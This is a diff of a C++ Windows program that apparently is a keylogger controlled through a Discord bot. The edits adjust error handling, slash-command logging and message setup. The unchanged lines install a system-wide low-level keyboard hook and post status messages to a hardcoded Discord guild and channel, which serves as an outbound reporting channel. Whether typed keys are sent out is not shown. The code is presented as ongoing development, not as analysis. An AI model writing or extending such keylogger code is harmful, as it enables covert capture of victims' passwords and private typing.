@@ -334,8 +334,12 @@ void logrun()
 {
 	std::unique_lock<std::mutex> locker(bot_connected_lock);
 	while (is_bot_connected == 0) bot_connected_condvar.wait(locker);
-	if (is_bot_connected == -1) return;
-	printf("Bot successfully initialized. Logging...");
+	if (is_bot_connected == -1) {	[[unlikely]]
+		printf("Bot failed to initialized. Terminating...");
+		return;
+	} else {
+		printf("Bot successfully initialized. Logging...");
+	}
 
 	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
 		MessageBoxW(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
@@ -357,30 +361,27 @@ void botrun()
             0, 0, 2, true,
             { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
             10, 0));
-    
+
+		std::cout << "Hello world\n";
 
         /* Output simple log messages to stdout */
         bot->on_log(dpp::utility::cout_logger());
 
-		botmsg = dpp::message(bot.get());
-		botmsg.set_guild_id(664744934003310592);
-		botmsg.set_channel_id(1056052934921699388);
-
-		dpp::message versionmsg(bot.get());
-
         /* Handle slash command */
-        bot->on_slashcommand([&versionmsg](const dpp::slashcommand_t& event) {
-			if (event.command.get_command_name() == "ping") {
+		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
+			size_t issuing_user = event.command.get_issuing_user().id;
+			std::string issuing_command = event.command.get_command_name();
+			if (issuing_command == "ping") {
                 event.reply("Pong!");
 			}
-			if (event.command.get_command_name() == "version") {
+			if (issuing_command == "version") {
 				char buffer[1001];
 				snprintf(buffer, 1000, "Hello world! Running on %s. Current time is %s",
 					dpp::utility::version().c_str(),
 					dpp::utility::current_date_time().c_str());
-				versionmsg.set_content(std::string(buffer));
-				event.reply(versionmsg);
+				event.reply(buffer);
 			}
+			printf("User %llu executed %s\n", issuing_user, issuing_command.c_str());
         });
 
         /* Register slash command here in on_ready */
@@ -388,19 +389,22 @@ void botrun()
             /* Wrap command registration in run_once to make sure it doesnt run on every full reconnection */
             if (dpp::run_once<struct register_bot_commands>()) {
                 bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
-				bot->global_command_create(dpp::slashcommand("version", "", bot->me.id));
+				bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
             }
         });
     
         /* Start the bot */
         bot->start(true);
 		is_bot_connected = 1;
+		botmsg = dpp::message(bot.get());
+		botmsg.set_guild_id(664744934003310592);
+		botmsg.set_channel_id(1056052934921699388);
 		botmsg.set_content("Session initialized!");
 		bot->message_create(botmsg);
 		bot_connected_condvar.notify_all();
     }
     catch (dpp::exception& e) {
-        std::cout << "\n" << e.what();
+        printf("\n%s", e.what());
 		is_bot_connected = -1;
 		bot_connected_condvar.notify_all();
     }
@@ -435,4 +439,5 @@ int main() {
 
 	fclose(dbg_file);
 	fclose(output_file);
+	return 0;
 }
